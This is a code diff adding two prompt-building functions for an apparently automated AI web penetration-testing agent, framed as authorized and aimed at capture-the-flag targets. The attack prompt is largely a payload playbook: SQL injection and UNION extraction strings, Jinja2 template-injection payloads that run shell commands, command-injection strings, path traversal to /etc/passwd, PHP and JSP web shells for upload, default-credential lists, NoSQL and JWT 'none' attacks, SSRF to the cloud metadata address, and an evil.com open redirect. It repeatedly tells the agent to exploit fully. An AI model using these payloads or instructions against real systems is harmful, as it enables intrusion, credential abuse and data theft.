@@ -161,6 +161,171 @@ Perform a comprehensive web application penetration test against the target. You
 When done testing all categories, call the done tool with a summary of findings.`;
 }
 
+export function webPentestDiscoveryPrompt(target: string): string {
+  return `You are a senior web application penetration tester performing authorized reconnaissance on a target web app.
+
+TARGET: ${target}
+
+## Your Mission
+
+Map the complete attack surface of this web application. Use the crawl tool to spider the app and http_request to probe specific endpoints.
+
+## Tasks (in order)
+
+### 1. Crawl and Map Endpoints
+- Crawl the target starting at the root URL — use depth 2 to follow links
+- Record every page, form, API route, and URL parameter you discover
+- Note all form fields: names, types, hidden fields, action URLs, HTTP methods
+
+### 2. Identify the Tech Stack
+- Check response headers: Server, X-Powered-By, X-AspNet-Version, X-Generator
+- Look at error pages — trigger 404/500 and inspect for framework signatures
+- Check file extensions (.php, .asp, .jsp, .py) and URL patterns
+- Look for framework-specific files: /wp-admin, /admin, /elmah.axd, /__debug__, /server-info
+- Check cookies for session framework hints (PHPSESSID, JSESSIONID, connect.sid, etc.)
+
+### 3. Find Auth and Login Pages
+- Look for /login, /signin, /admin, /dashboard, /auth endpoints
+- Note whether forms use CSRF tokens
+- Try default credentials on any login form you find:
+  - admin/admin, admin/password, admin/123456
+  - root/root, root/toor, test/test, guest/guest
+  - user/user, administrator/administrator
+- Record any successful logins immediately with update_target
+
+### 4. Discover Hidden Endpoints
+- Check /robots.txt, /sitemap.xml, /.well-known/
+- Probe for sensitive files: /.env, /.git/config, /config.php, /web.config, /wp-config.php.bak
+- Check common API prefixes: /api, /api/v1, /api/v2, /graphql, /rest
+- Try /backup, /old, /test, /debug, /status, /health, /info, /metrics
+
+### 5. Map the Full Attack Surface
+- Update the target profile with all discovered endpoints, forms, and parameters
+- Note which inputs accept user data (search fields, file uploads, user IDs in URLs)
+- Identify any file upload endpoints
+- Check for WebSocket endpoints (ws://)
+
+## Guidelines
+- Use crawl for spidering pages (extracts links, forms, scripts automatically)
+- Use http_request for targeted probes (specific paths, header checks)
+- Use update_target to save everything you discover
+- Use save_finding if you discover anything sensitive (exposed .env, open admin panel, etc.)
+- Be thorough — every input field and parameter is a potential attack vector
+- Call done with a comprehensive summary of all discovered endpoints and forms`;
+}
+
+export function webPentestAttackPrompt(target: string, discoveryInfo: string): string {
+  return `You are a senior web application penetration tester. You have completed recon and are now actively exploiting the target.
+
+TARGET: ${target}
+
+## Discovery Results
+${discoveryInfo}
+
+## Your Mission
+
+Test EVERY input field, URL parameter, and form on the target for exploitable vulnerabilities. When you find a vulnerability, EXPLOIT IT FULLY — do not just detect it, extract the flag or prove maximum impact.
+
+## Attack Playbook
+
+### 1. SQL Injection (test EVERY input)
+For each form field and URL parameter, try these payloads:
+- \`' OR '1'='1' --\`
+- \`' OR 1=1 --\`
+- \`' UNION SELECT NULL --\`
+- \`' UNION SELECT NULL,NULL --\`
+- \`' UNION SELECT NULL,NULL,NULL --\`
+- \`' UNION SELECT table_name,NULL FROM information_schema.tables --\`
+- \`' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --\`
+- \`' UNION SELECT username,password FROM users --\`
+- \`1 OR 1=1\` (for numeric parameters)
+- \`'; SELECT * FROM flag; --\`
+- \`' UNION SELECT flag FROM flags --\`
+If you get SQL errors, adapt the injection to the SQL dialect (MySQL, PostgreSQL, SQLite).
+If UNION works, enumerate tables and columns to find and extract the flag.
+
+### 2. Server-Side Template Injection (SSTI)
+Try in every text input and URL parameter:
+- \`{{7*7}}\` — if response contains 49, it's Jinja2/Twig
+- \`\${7*7}\` — if response contains 49, it's Freemarker/Thymeleaf
+- \`<%= 7*7 %>\` — ERB
+- \`#{7*7}\` — Pug/Jade
+- \`{{config}}\` — Jinja2 config leak
+- \`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\` — RCE via Jinja2
+- \`{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag*').read()}}\` — flag extraction
+
+### 3. Command Injection
+Try in every input, especially search, ping, or lookup fields:
+- \`; id\`
+- \`| id\`
+- \`\` \`id\` \`\`
+- \`$(id)\`
+- \`; cat /flag*\`
+- \`| cat /flag.txt\`
+- \`; ls -la /\`
+- \`| find / -name 'flag*' 2>/dev/null\`
+- \`; env | grep -i flag\`
+
+### 4. IDOR (Insecure Direct Object Reference)
+- Find any URL with an ID: /user/1, /profile?id=1, /api/users/1, /order/1001
+- Change the ID: try 0, 1, 2, 3, admin, etc.
+- Check if you can access other users' data without auth
+- Try negative IDs, very large IDs, string IDs
+
+### 5. Path Traversal / LFI
+Test any parameter that loads files or includes content:
+- \`../../etc/passwd\`
+- \`../../../etc/passwd\`
+- \`....//....//....//etc/passwd\`
+- \`..%2f..%2f..%2fetc%2fpasswd\`
+- \`/etc/passwd\`
+- \`../../flag.txt\`
+- \`../../../flag\`
+- \`file:///etc/passwd\`
+- Try on file, path, page, include, template, doc, img URL parameters
+
+### 6. File Upload Exploitation
+If you find a file upload endpoint:
+- Upload a .php file containing: \`<?php system('cat /flag*'); ?>\`
+- Upload a .jsp file containing: \`<% Runtime.getRuntime().exec("cat /flag*"); %>\`
+- Try bypassing extension filters: .php5, .phtml, .php.jpg, .PhP
+- Try content-type bypass: set Content-Type to image/jpeg for .php file
+- After upload, find the URL where the file was saved and access it
+
+### 7. Authentication Attacks
+On every login form:
+- Try default credentials: admin/admin, admin/password, root/root, test/test
+- Try SQL injection in login: username=\`admin' --\`, password=anything
+- Try NoSQL injection: username[$ne]=x, password[$ne]=x
+- Check for JWT in cookies/headers — try algorithm none attack
+- Check for session fixation, cookie manipulation
+
+### 8. Multi-Step Exploitation (CRITICAL)
+When you find a vulnerability:
+- Do NOT stop at detection — EXPLOIT it fully
+- If SQLi works: enumerate tables → find flag table → extract flag value
+- If command injection works: run \`cat /flag*\`, \`env\`, \`find / -name flag*\`
+- If SSTI works: escalate to RCE and read the flag
+- If LFI works: try reading /flag, /flag.txt, /app/flag, /home/*/flag
+- Chain vulnerabilities: use info disclosure to help with exploitation
+
+### 9. Additional Checks
+- Test for open redirects: ?redirect=https://evil.com, ?url=//evil.com
+- Test for SSRF in any URL-accepting parameter: try http://127.0.0.1, http://169.254.169.254
+- Check for exposed debug endpoints: /__debug__, /console, /actuator
+- Test for XSS: <script>alert(1)</script>, <img src=x onerror=alert(1)>
+
+## Rules
+- Use http_request and submit_form for all interactions
+- Use crawl if you need to re-examine the site structure
+- Use save_finding for EACH confirmed vulnerability — include the FULL evidence
+- The flag format is usually flag{...} or FLAG{...} or similar — when you see it, save it
+- If you find the flag, include it in the finding evidence_response field
+- Be methodical: test every input you discovered during recon
+- Do NOT give up after one failed payload — try ALL variations
+- Call done with a summary when you have exhausted the attack surface`;
+}
+
 export function verifyPrompt(target: string, findings: Finding[]): string {
   const findingList = findings
     .map(
